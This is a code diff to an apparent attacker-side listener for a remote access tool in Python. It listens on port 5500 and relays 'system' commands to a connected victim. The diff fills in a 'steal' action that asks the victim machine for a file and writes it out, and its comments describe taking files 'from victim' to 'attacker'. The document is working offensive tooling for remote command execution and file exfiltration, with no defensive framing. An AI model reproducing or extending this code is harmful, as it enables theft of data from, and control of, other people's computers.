@@ -3,6 +3,19 @@ from socket import *
 HOST = ""
 PORT = 5500
 
+def steal(sock, path):
+	file = open(path, "wb")
+	end = "end".encode()
+
+	f = sock.recv(1024)
+	while f != end:
+		file.write(f)
+		f = sock.recv(1024)
+	file.close()	
+	
+
+
+
 def listen():
 	s = socket(AF_INET, SOCK_STREAM)
 	s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
@@ -27,10 +40,16 @@ def main():
 			if action == "system":
 				sock.send(data.encode())
 				response = sock.recv(1024)
-				
+			
+
+			# will open a file on target and send it to attacker
+			# usage: steal /path/on/victim /path/on/attacker	
 			elif action == "steal":
-				# TODO
-				pass
+				sock.send(data.encode())
+				path = data.split()[2]
+				steal(sock, path)
+				response = b"[+] file received"
+				
 			elif action == "place":
 				# TODO
 				pass
@@ -38,7 +57,7 @@ def main():
 				pass
 
 			print(response.decode())
-			
+
 		else:
 			pass
 
